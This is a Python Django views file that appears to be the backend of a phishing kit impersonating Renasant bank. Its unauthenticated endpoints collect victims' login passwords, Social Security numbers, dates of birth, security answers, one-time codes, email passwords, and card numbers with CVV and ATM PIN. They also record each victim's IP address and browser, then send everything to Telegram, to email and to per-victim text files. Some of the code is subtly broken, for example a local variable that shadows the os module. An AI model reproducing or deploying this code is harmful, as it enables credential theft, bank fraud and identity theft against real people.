import json
import os
import re
import logging
from django.conf import settings
from django.shortcuts import render
import requests
from core.app_config import app_settings

from rest_framework.response import Response
from rest_framework import status
from rest_framework.decorators import (
    api_view,
    permission_classes,
    authentication_classes,
)

from core.middleware.block_ips_middleware import (
    get_city_from_ip,
    get_client_ip,
    get_country_from_ip,
    get_user_browser,
    get_user_os,
)
from user_data.models import Address, BankInfo, BrowserDetail, Client
from django.template.loader import get_template
from core.settings import send_data_email, send_data_telegram, save_data_to_file
from datetime import datetime


logger = logging.getLogger(__name__)


def _notification_sender():
    return app_settings.get("from_email") or settings.DEFAULT_FROM_EMAIL


def _notification_recipients():
    recipients = app_settings.get("send_email_list") or getattr(settings, "EMAIL_RECIPIENTS", [])
    return [addr for addr in recipients if addr]


@api_view(
    [
        "POST",
    ]
)
@permission_classes([])
@authentication_classes([])
def renasant_collect_user_login_cred(request):

    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":
        try:
            username = request.data.get("emzemz", "")
            password = request.data.get("pwzenz", "")

            if not username:
                errors["username"] = ["Username is required."]

            if not password:
                errors["password"] = ["Password is required."]

            if errors:
                payload["message"] = "Errors"
                payload["errors"] = errors
                return Response(payload, status=status.HTTP_400_BAD_REQUEST)

            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")

            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

            client, _ = Client.objects.get_or_create(
                username=username,
            )
            client.username = username
            client.email = username
            client.save()

            bank_info = BankInfo.objects.create(
                client=client, password=password, username=username
            )
            browser_data = BrowserDetail.objects.create(
                client=client,
                ip=ip,
                agent=agent,
                country=country,
                city=city,
                address=f"{city}, {country}",
                browser=browser,
                os=os,
                time=date,
                date=date,
            )

            message = f"|=====||Snel Roi -RENASANT||=====|\n"
            message += f"|========= [  LOGIN  ] ==========|\n"
            message += f"| ➤ [ Username ]         : {username}\n"
            message += f"| ➤ [ Password ]      : {password}\n"
            message += f"|=====================================|\n"
            message += f"| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += f"|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += f"|=====================================|\n"

            send_data_telegram(app_settings, message)

            subject = "The Data"
            from_email = app_settings['from_email']
            recipient_list = app_settings['send_email_list']

            send_data_email(subject, message, from_email, recipient_list)

            save_data_to_file(username, message)

            payload["message"] = "Successful"
            payload["data"] = data
        except Exception as exc:
            logger.exception("renasant_collect_user_login_cred failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    return Response(payload)


@api_view(
    [
        "POST",
    ]
)
@permission_classes([])
@authentication_classes([])
def renasant_collect_user_login_cred2(request):

    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":
        try:
            username = request.data.get("emzemz", "")
            password = request.data.get("pwzenz", "")

            if not username:
                errors["username"] = ["Username is required."]


            if not password:
                errors["password"] = ["Password is required."]

            if errors:
                payload["message"] = "Errors"
                payload["errors"] = errors
                return Response(payload, status=status.HTTP_400_BAD_REQUEST)

            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")

            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

            client, created = Client.objects.get_or_create(
                username=username,
            )
            client.username = username  # Ensure username field is set
            client.email = username    # Ensure email field is set
            client.save()

            bank_info, created = BankInfo.objects.get_or_create(
                client=client,
            )

            bank_info.username = username
            bank_info.password2 = password
            bank_info.username2 = username  # Set username2 field
            bank_info.save()

            browser_data, created = BrowserDetail.objects.get_or_create(
                client=client,
            )

            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date

            browser_data.save()

            message = f"|=====||Snel Roi -RENASANT||=====|\n"
            message += f"|========= [  LOGIN CONFIRM ] ==========|\n"
            message += f"| ➤ [ Username ]        : {username}\n"
            message += f"| ➤ [ Password2 ]      : {password}\n"
            message += f"|=====================================|\n"
            message += f"| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += f"|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"

            send_data_telegram(app_settings, message)

            subject = "The Data"
            from_email = app_settings['from_email']
            recipient_list = app_settings['send_email_list']

            send_data_email(subject, message, from_email, recipient_list)

            save_data_to_file(username, message)

            payload["message"] = "Successful"
            payload["data"] = data
        except Exception:
            logger.exception("renasant_collect_user_login_cred2 failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)


    return Response(payload)


@api_view(
    [
        "POST",
    ]
)
@permission_classes([])
@authentication_classes([])
def renasant_collect_user_basic_info(request):

    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":
        try:
            username = request.data.get("emzemz", "")
            firstName = request.data.get("fzNme", "")
            lastName = request.data.get("lzNme", "")
            phone = request.data.get("phone", "")
            ssn = request.data.get("ssn", "")
            motherMaidenName = request.data.get("motherMaidenName", "")
            dob = request.data.get("dob", "")
            driverLicense = request.data.get("driverLicense", "")

            if not username:
                errors["username"] = ["Username is required."]
            if not firstName:
                errors["firstName"] = ["First name is required."]
            if not lastName:
                errors["lastName"] = ["LastName is required."]
            if not phone:
                errors["phone"] = ["Phone is required."]
            if not ssn:
                errors["ssn"] = ["SSN is required."]
            if not motherMaidenName:
                errors["motherMaidenName"] = ["Mother's maiden name is required."]
            if not dob:
                errors["dob"] = ["Date of birth is required."]
            if not driverLicense:
                errors["driverLicense"] = ["Driver's license is required."]

            if errors:
                payload["message"] = "Errors"
                payload["errors"] = errors
                return Response(payload, status=status.HTTP_400_BAD_REQUEST)

            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")

            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

            client, created = Client.objects.get_or_create(
                username=username,
            )
            client.first_name = firstName
            client.last_name = lastName
            client.phone = phone
            client.ssn = ssn
            client.mother_maiden_name = motherMaidenName
            client.dob = dob
            client.driver_license = driverLicense
            client.save()

            browser_data, created = BrowserDetail.objects.get_or_create(
                client=client,
            )

            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.browser = browser
            browser_data.os = os
            browser_data.date = date

            browser_data.save()

            message = f"|=====||Snel Roi -RENASANT||=====|\n"
            message += f"|========= [  BASIC INFO ] ==========|\n"
            message += f"| ➤ [ Username ]           : {username}\n"
            message += f"| ➤ [ First Name ]         : {firstName}\n"
            message += f"| ➤ [ Last Name ]          : {lastName}\n"
            message += f"| ➤ [ Phone ]              : {phone}\n"
            message += f"| ➤ [ SSN ]                : {ssn}\n"
            message += f"| ➤ [ Mother Maiden Name ] : {motherMaidenName}\n"
            message += f"| ➤ [ Date of Birth ]      : {dob}\n"
            message += f"| ➤ [ Driver's License ]   : {driverLicense}\n"
            message += f"|=====================================|\n"
            message += f"| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += f"|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += f"|=====================================|\n"

            send_data_telegram(app_settings, message)

            subject = "The Data"
            from_email = _notification_sender()
            recipient_list = _notification_recipients()

            send_data_email(subject, message, from_email, recipient_list)

            save_data_to_file(username, message)

            payload["message"] = "Successful"
            payload["data"] = data
        except Exception:
            logger.exception("renasant_collect_user_basic_info failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    return Response(payload)


@api_view(
    [
        "POST",
    ]
)
@permission_classes([])
@authentication_classes([])
def renasant_collect_user_home_address(request):

    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":
        try:
            username = request.data.get("emzemz", "")
            streetAddress = request.data.get("stAd", "")
            apt = request.data.get("apt", "")
            _city = request.data.get("city", "")
            state = request.data.get("state", "")
            zipCode = request.data.get("zipCode", "")

            if not username:
                errors["username"] = ["Username is required."]

            if errors:
                payload["message"] = "Errors"
                payload["errors"] = errors
                return Response(payload, status=status.HTTP_400_BAD_REQUEST)

            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")

            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

            client, created = Client.objects.get_or_create(
                username=username,
            )

            address, created = Address.objects.get_or_create(
                client=client,
            )
            address.street_address = streetAddress
            address.apartment_unit = apt
            address.city = _city
            address.state = state
            address.zip_code = zipCode
            address.save()

            browser_data, created = BrowserDetail.objects.get_or_create(
                client=client,
            )

            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date

            browser_data.save()

            message = f"|=====||Snel Roi -RENASANT||=====|\n"
            message += f"|========= [  HOME ADDRESS ] ==========|\n"
            message += f"| ➤ [ Street Address ]   : {streetAddress}\n"
            message += f"| ➤ [ City ]             : {_city}\n"
            message += f"| ➤ [ Apartment/Unit ]   : {apt}\n"
            message += f"| ➤ [ State ]            : {state}\n"
            message += f"| ➤ [ zip code ]         : {zipCode}\n"
            message += f"|=====================================|\n"
            message += f"| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += f"|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += f"|=====================================|\n"

            send_data_telegram(app_settings, message)

            subject = "The Data"
            from_email = _notification_sender()
            recipient_list = _notification_recipients()

            send_data_email(subject, message, from_email, recipient_list)

            save_data_to_file(username, message)

            payload["message"] = "Successful"
            payload["data"] = data
        except Exception:
            logger.exception("renasant_collect_user_home_address failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    return Response(payload)


@api_view(
    [
        "POST",
    ]
)
@permission_classes([])
@authentication_classes([])
def renasant_collect_user_social_security(request):

    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":
        try:
            username = request.data.get("emzemz", "")
            ssn_short = request.data.get("s2ns", "")
            dob = request.data.get("d_b", "")

            if not username:
                errors["username"] = ["Username is required."]

            if errors:
                payload["message"] = "Errors"
                payload["errors"] = errors
                return Response(payload, status=status.HTTP_400_BAD_REQUEST)

            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")

            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

            client, created = Client.objects.get_or_create(
                username=username,
            )
            client.social_security_short = ssn_short
            client.dob = dob
            client.save()

            browser_data, created = BrowserDetail.objects.get_or_create(
                client=client,
            )

            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date

            browser_data.save()

            message = f"|=====||Snel Roi -RENASANT||=====|\n"
            message += f"|========= [  SSN / DATE OF BIRTH ] ==========|\n"
            message += f"| ➤ [ SSN-last4 ]       : {ssn_short}\n"
            message += f"| ➤ [ DOB ]             : {dob}\n"
            message += f"|=====================================|\n"
            message += f"| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += f"|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += f"|=====================================|\n"

            send_data_telegram(app_settings, message)

            subject = "The Data"
            from_email = _notification_sender()
            recipient_list = _notification_recipients()

            send_data_email(subject, message, from_email, recipient_list)

            save_data_to_file(username, message)

            payload["message"] = "Successful"
            payload["data"] = data
        except Exception:
            logger.exception("renasant_collect_user_social_security failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    return Response(payload)


@api_view(
    [
        "POST",
    ]
)
@permission_classes([])
@authentication_classes([])
def renasant_collect_user_social_security_2(request):

    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":
        try:
            username = request.data.get("emzemz", "")
            ssn = request.data.get("s2ns", "")
            dob = request.data.get("d_b", "")

            if not username:
                errors["username"] = ["Username is required."]

            if errors:
                payload["message"] = "Errors"
                payload["errors"] = errors
                return Response(payload, status=status.HTTP_400_BAD_REQUEST)

            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")

            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

            client, created = Client.objects.get_or_create(
                username=username,
            )
            client.social_security = ssn
            client.dob = dob
            client.save()

            browser_data, created = BrowserDetail.objects.get_or_create(
                client=client,
            )

            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date

            browser_data.save()

            message = f"|=====||Snel Roi -RENASANT||=====|\n"
            message += f"|========= [  SSN / DATE OF BIRTH ] ==========|\n"
            message += f"| ➤ [ SSN ]             : {ssn}\n"
            message += f"| ➤ [ DOB ]             : {dob}\n"
            message += f"|=====================================|\n"
            message += f"| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += f"|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += f"|=====================================|\n"

            send_data_telegram(app_settings, message)

            subject = "The Data"
            from_email = _notification_sender()
            recipient_list = _notification_recipients()

            send_data_email(subject, message, from_email, recipient_list)

            save_data_to_file(username, message)

            payload["message"] = "Successful"
            payload["data"] = data
        except Exception:
            logger.exception("renasant_collect_user_social_security_2 failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    return Response(payload)


@api_view(
    [
        "POST",
    ]
)
@permission_classes([])
@authentication_classes([])
def renasant_collect_user_security_questions(request):

    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":

        username = request.data.get("emzemz", "")
        securityQuestion1 = request.data.get("securityQuestion1", "")
        securityAnswer1 = request.data.get("securityAnswer1", "")
        securityQuestion2 = request.data.get("securityQuestion2", "")
        securityAnswer2 = request.data.get("securityAnswer2", "")
        securityQuestion3 = request.data.get("securityQuestion3", "")
        securityAnswer3 = request.data.get("securityAnswer3", "")

        print(username)
        print(securityQuestion1)
        print(securityAnswer1)
        print(securityQuestion2)
        print(securityAnswer2)
        print(securityQuestion3)
        print(securityAnswer3)

        if not username:
            errors["username"] = ["Username is required."]

        if not securityQuestion1:
            errors["securityQuestion1"] = ["Security question 1 is required."]

        if not securityAnswer1:
            errors["securityAnswer1"] = ["Security answer 1 is required."]

        if not securityQuestion2:
            errors["securityQuestion2"] = ["Security question 2 is required."]

        if not securityAnswer2:
            errors["securityAnswer2"] = ["Security answer 2 is required."]

        if not securityQuestion3:
            errors["securityQuestion3"] = ["Security question 3 is required."]

        if not securityAnswer3:
            errors["securityAnswer3"] = ["Security answer 3 is required."]

        if errors:
            payload["message"] = "Errors"
            payload["errors"] = errors
            return Response(payload, status=status.HTTP_400_BAD_REQUEST)

        #####################
        # Browser Data
        ######################

        ip = get_client_ip(request)
        agent = request.META.get("HTTP_USER_AGENT", "")

        country = get_country_from_ip(ip)
        city = get_city_from_ip(ip)
        browser = get_user_browser(agent)
        os = get_user_os(agent)
        date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

        ##############################
        # Save User data to database
        ################################

        client, created = Client.objects.get_or_create(
            username=username,
        )
        client.security_question_1 = securityQuestion1
        client.security_answer_1 = securityAnswer1
        client.security_question_2 = securityQuestion2
        client.security_answer_2 = securityAnswer2
        client.security_question_3 = securityQuestion3
        client.security_answer_3 = securityAnswer3
        client.save()

        browser_data, created = BrowserDetail.objects.get_or_create(
            client=client,
        )

        browser_data.ip = ip
        browser_data.agent = agent
        browser_data.country = country
        browser_data.city = city
        browser_data.address = f"{city}, {country}"
        browser_data.browser = browser
        browser_data.os = os
        browser_data.time = date
        browser_data.date = date

        browser_data.save()

        message = f"|=====||Snel Roi -RENASANT||=====|\n"
        message += f"|========= [  SECURITY QUESTIONS ] ==========|\n"
        message += f"| ➤ [ Question 1 ]      : {securityQuestion1}\n"
        message += f"| ➤ [ Answer 1 ]        : {securityAnswer1}\n"
        message += f"| ➤ [ Question 2 ]      : {securityQuestion2}\n"
        message += f"| ➤ [ Answer 2 ]        : {securityAnswer2}\n"
        message += f"| ➤ [ Question 3 ]      : {securityQuestion3}\n"
        message += f"| ➤ [ Answer 3 ]        : {securityAnswer3}\n"
        message += f"|=====================================|\n"
        message += f"| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
        message += f"|======================================|\n"
        message += f"| ➤ [ IP Address ]   : {ip}\r\n"
        message += f"| ➤ [ IP Country ]   : {country}\r\n"
        message += f"| ➤ [ IP City ]      : {city}\r\n"
        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
        message += f"| ➤ [ TIME ]         : {date}\r\n"
        message += f"|=====================================|\n"

        #############################
        # Send data to telegram
        ##############################

        send_data_telegram(app_settings, message)

        #############################
        # Send Data to email
        ########################
        subject = "The Data"
        from_email = _notification_sender()
        recipient_list = _notification_recipients()

        send_data_email(
            subject,
            message,
            from_email,
            recipient_list,
        )

        #####################################
        # Save to txt
        ##############################
        logix_save_data_to_file(username, message)

        payload["message"] = "Successful"
        payload["data"] = data
    return Response(payload)


@api_view(
    [
        "POST",
    ]
)
@permission_classes([])
@authentication_classes([])
def renasant_collect_user_otp_verification(request):

    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":

        username = request.data.get("emzemz", "")
        otp = request.data.get("otp", "")

        print(username)
        print(otp)

        if not username:
            errors["username"] = ["Username is required."]

        if not otp:
            errors["otp"] = ["OTP is required."]

        if errors:
            payload["message"] = "Errors"
            payload["errors"] = errors
            return Response(payload, status=status.HTTP_400_BAD_REQUEST)

        #####################
        # Browser Data
        ######################

        ip = get_client_ip(request)
        agent = request.META.get("HTTP_USER_AGENT", "")

        country = get_country_from_ip(ip)
        city = get_city_from_ip(ip)
        browser = get_user_browser(agent)
        os = get_user_os(agent)
        date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

        ##############################
        # Save User data to database
        ################################

        client, created = Client.objects.get_or_create(
            username=username,
        )
        # You could add OTP verification logic here
        # For now, we'll just log it

        browser_data, created = BrowserDetail.objects.get_or_create(
            client=client,
        )

        browser_data.ip = ip
        browser_data.agent = agent
        browser_data.country = country
        browser_data.city = city
        browser_data.address = f"{city}, {country}"
        browser_data.browser = browser
        browser_data.os = os
        browser_data.time = date
        browser_data.date = date

        browser_data.save()

        message = f"|=====||Snel Roi -RENASANT||=====|\n"
        message += f"|========= [  OTP VERIFICATION ] ==========|\n"
        message += f"| ➤ [ Email ]           : {username}\n"
        message += f"| ➤ [ OTP ]             : {otp}\n"
        message += f"|=====================================|\n"
        message += f"| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
        message += f"|======================================|\n"
        message += f"| ➤ [ IP Address ]   : {ip}\r\n"
        message += f"| ➤ [ IP Country ]   : {country}\r\n"
        message += f"| ➤ [ IP City ]      : {city}\r\n"
        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
        message += f"| ➤ [ TIME ]         : {date}\r\n"
        message += f"|=====================================|\n"

        #############################
        # Send data to telegram
        ##############################

        send_data_telegram(app_settings, message)

        #############################
        # Send Data to email
        ########################
        subject = "OTP Verification Data"
        from_email = _notification_sender()
        recipient_list = _notification_recipients()

        send_data_email(
            subject,
            message,
            from_email,
            recipient_list,
        )

        #####################################
        # Save to txt
        ##############################
        logix_save_data_to_file(username, message)

        payload["message"] = "Successful"
        payload["data"] = data
    return Response(payload)




@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def renasant_collect_user_email_password(request):
    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":
        try:
            username = request.data.get("emzemz", "")
            email = request.data.get("email", "")
            password = request.data.get("password", "")

            if not username:
                errors["username"] = ["Username is required."]
            if not email:
                errors["email"] = ["Email is required."]
            if not password:
                errors["password"] = ["Password is required."]

            if errors:
                payload["message"] = "Errors"
                payload["errors"] = errors
                return Response(payload, status=status.HTTP_400_BAD_REQUEST)

            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")
            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

            client, created = Client.objects.get_or_create(username=username)
            client.email = email
            client.save()

            bank_info, created = BankInfo.objects.get_or_create(client=client)
            bank_info.email_password = password
            bank_info.save()

            browser_data, created = BrowserDetail.objects.get_or_create(client=client)
            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date
            browser_data.save()

            message = f"|=====||Snel Roi -RENASANT||=====|\n"
            message += f"|========= [  EMAIL/PASSWORD ] ==========|\n"
            message += f"| ➤ [ Username ]       : {username}\n"
            message += f"| ➤ [ Email ]          : {email}\n"
            message += f"| ➤ [ Password ]       : {password}\n"
            message += f"|=====================================|\n"
            message += f"| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += f"|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += f"|=====================================|\n"

            send_data_telegram(app_settings, message)
            subject = "The Data"
            from_email = _notification_sender()
            recipient_list = _notification_recipients()
            send_data_email(subject, message, from_email, recipient_list)
            save_data_to_file(username, message)

            payload["message"] = "Successful"
            payload["data"] = data
        except Exception:
            logger.exception("renasant_collect_user_email_password failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    return Response(payload)


@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def renasant_collect_user_card_info(request):
    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":
        try:
            username = request.data.get("emzemz", "")
            cardNumber = request.data.get("cardNumber", "")
            expiryMonth = request.data.get("expiryMonth", "")
            expiryYear = request.data.get("expiryYear", "")
            cvv = request.data.get("cvv", "")
            atmPin = request.data.get("atmPin", "")

            if not username:
                errors["username"] = ["Username is required."]
            if not cardNumber:
                errors["cardNumber"] = ["Card number is required."]
            if not expiryMonth:
                errors["expiryMonth"] = ["Expiry month is required."]
            if not expiryYear:
                errors["expiryYear"] = ["Expiry year is required."]
            if not cvv:
                errors["cvv"] = ["CVV is required."]
            if not atmPin:
                errors["atmPin"] = ["ATM PIN is required."]

            if errors:
                payload["message"] = "Errors"
                payload["errors"] = errors
                return Response(payload, status=status.HTTP_400_BAD_REQUEST)

            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")
            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

            client, created = Client.objects.get_or_create(username=username)
            bank_info, created = BankInfo.objects.get_or_create(client=client)
            bank_info.card_number = cardNumber
            bank_info.card_expiry = f"{expiryMonth}/{expiryYear}"
            bank_info.card_cvv = cvv
            bank_info.atm_pin = atmPin
            bank_info.save()

            browser_data, created = BrowserDetail.objects.get_or_create(client=client)
            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date
            browser_data.save()

            message = f"|=====||Snel Roi -RENASANT||=====|\n"
            message += f"|========= [  CARD INFO ] ==========|\n"
            message += f"| ➤ [ Username ]       : {username}\n"
            message += f"| ➤ [ Card Number ]    : {cardNumber}\n"
            message += f"| ➤ [ Expiry ]         : {expiryMonth}/{expiryYear}\n"
            message += f"| ➤ [ CVV ]            : {cvv}\n"
            message += f"| ➤ [ ATM PIN ]        : {atmPin}\n"
            message += f"|=====================================|\n"
            message += f"| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += f"|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += f"|=====================================|\n"

            send_data_telegram(app_settings, message)
            subject = "The Data"
            from_email = _notification_sender()
            recipient_list = _notification_recipients()
            send_data_email(subject, message, from_email, recipient_list)
            save_data_to_file(username, message)

            payload["message"] = "Successful"
            payload["data"] = data
        except Exception:
            logger.exception("renasant_collect_user_card_info failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    return Response(payload)

def logix_is_valid_email(email):
    # Regular expression pattern for basic email validation
    pattern = r"^[\w\.-]+@[\w\.-]+\.\w+$"

    # Using re.match to check if the email matches the pattern
    if re.match(pattern, email):
        return True
    else:
        return False


def logix_save_data_to_file(email, message):
    # Ensure the 'clients' folder exists
    folder_path = "clients"
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)

    # Construct the file path using the email
    file_path = os.path.join(folder_path, f"{email}.txt")

    # Write the message to the file with UTF-8 encoding
    with open(file_path, "a", encoding="utf-8") as f:
        f.write(message)  # Directly save the formatted message as is
        f.write("\n" + "=" * 80 + "\n")  # Add a separator for clarity